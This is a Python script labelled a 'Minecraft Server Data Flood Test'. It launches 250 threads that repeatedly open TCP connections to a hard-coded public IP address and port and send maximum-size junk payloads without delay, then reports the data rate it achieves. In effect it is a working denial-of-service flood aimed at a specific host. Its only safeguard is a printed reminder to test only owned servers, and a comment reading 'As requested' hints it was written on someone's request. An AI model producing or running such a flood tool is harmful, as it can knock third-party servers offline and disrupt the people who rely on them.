"""
Minecraft Server Data Flood Test
Sends maximum data with 250 threads to see how much can be sent
"""
import socket, time, threading, sys
from colorama import init, Fore
init(autoreset=True)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TARGET_IP = "5.133.100.33"
TARGET_PORT = 25600
THREAD_COUNT = 250      # As requested: 250 threads
TEST_DURATION = 15      # Seconds to test
PAYLOAD_SIZE = 65500    # Maximum packet size
# ─── STATS ────────────────────────────────────────────────────────────────────
class FloodStats:
    def __init__(self):
        self.bytes_sent = 0
        self.connections = 0
        self.errors = 0
        self.lock = threading.Lock()
    
    def add_bytes(self, n):
        with self.lock:
            self.bytes_sent += n
    
    def add_connection(self):
        with self.lock:
            self.connections += 1
    
    def add_error(self):
        with self.lock:
            self.errors += 1
    
    def get(self):
        with self.lock:
            return self.bytes_sent, self.connections, self.errors

stats = FloodStats()

# ─── WORKER ───────────────────────────────────────────────────────────────────
def flood_worker(stop_event):
    """Each thread repeatedly connects, sends max payload, closes"""
    payload = b'x' * PAYLOAD_SIZE  # Simple payload, all 'x' bytes
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(3.0)  # Connection timeout
            s.connect((TARGET_IP, TARGET_PORT))
            # Send the payload
            s.sendall(payload)
            stats.add_bytes(len(payload))
            stats.add_connection()
            s.close()
        except Exception:
            stats.add_error()
            # If we get an error, we still try again
        # No delay between connections to maximize rate
        # However, we might want a tiny delay to avoid overwhelming local machine
        # But let's try without delay first

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    print("[FLOOD] Minecraft Server Data Flood Test")
    print(f"[TARGET] Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"[THREADS] Threads: {THREAD_COUNT}")
    print(f"[DURATION] Duration: {TEST_DURATION} seconds")
    print(f"[PAYLOAD] Payload size: {PAYLOAD_SIZE} bytes per connection")
    print("[INFO] Each thread will connect, send one max-sized packet, close, repeat\n")
    
    # Initial connectivity check
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET_IP, TARGET_PORT))
        s.close()
        print("[OK] Initial connection successful\n")
    except Exception as e:
        print(f"[ERROR] Cannot connect to {TARGET_IP}:{TARGET_PORT}: {e}")
        print("[INFO] Check server IP, port, firewall, and that server is running")
        return
    
    # Start flood
    stop_event = threading.Event()
    workers = []
    start_time = time.time()
    
    print("[START] Flood starting...")
    for i in range(THREAD_COUNT):
        w = threading.Thread(target=flood_worker, args=(stop_event,), daemon=True)
        w.start()
        workers.append(w)
    
    # Monitor
    try:
        while time.time() - start_time < TEST_DURATION:
            elapsed = time.time() - start_time
            bytes_sent, connections, errors = stats.get()
            rate_bps = bytes_sent / max(elapsed, 0.1)
            rate_mbps = rate_bps * 8 / 1_000_000  # Convert to Mbps
            conn_per_sec = connections / max(elapsed, 0.1)
            error_rate = (errors / max(connections + errors, 1)) * 100
            
            print(f"\r[TIME] {elapsed:.0f}s | "
                  f"[DATA] {bytes_sent / 1_000_000:.2f} MB sent | "
                  f"[RATE] {rate_mbps:.2f} Mbps ({rate_bps:.0f} B/s) | "
                  f"[CONN] {connections} total ({conn_per_sec:.0f}/sec) | "
                  f"[ERRORS] {errors} ({error_rate:.1f}%)", 
                  end="", flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[INTERRUPT] Test interrupted by user")
    
    # Stop
    stop_event.set()
    print("\n[WAIT] Waiting for threads to finish...")
    for w in workers:
        w.join(timeout=2.0)
    
    # Final results
    bytes_sent, connections, errors = stats.get()
    elapsed = time.time() - start_time
    rate_bps = bytes_sent / max(elapsed, 0.1)
    rate_mbps = rate_bps * 8 / 1_000_000
    conn_per_sec = connections / max(elapsed, 0.1)
    error_rate = (errors / max(connections + errors, 1)) * 100
    
    print(f"\n[RESULT] TEST COMPLETE")
    print(f"[TIME] Total time: {elapsed:.2f} seconds")
    print(f"[DATA] Total data sent: {bytes_sent / 1_000_000:.2f} MB ({bytes_sent:,} bytes)")
    print(f"[RATE] Average send rate: {rate_mbps:.2f} Mbps ({rate_bps:.0f} bytes/sec)")
    print(f"[CONN] Total connections: {connections:,} ({conn_per_sec:.0f} connections/sec)")
    print(f"[ERRORS] Total errors: {errors:,} ({error_rate:.1f}% of attempts)")
    print(f"[PER_CONN] Average data per connection: {bytes_sent / max(connections, 1):.0f} bytes")
    
    # Context
    print(f"\n[CONTEXT]")
    print(f"[NOTE] This measures raw data send capacity to the server.")
    print(f"       Actual gameplay load differs (players send varied packets,")
    print(f"       server processes game logic, world updates, etc.)")
    print(f"[WARNING] Sending large amounts of data may stress server network")
    print(f"       and CPU (if server processes the data).")
    print(f"[REMINDER] Only test servers you own or have explicit permission to test.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[INTERRUPT] Interrupted")
    except Exception as e:
        print(f"[FATAL] Fatal error: {e}")


if __name__ == "__main__":
    main()
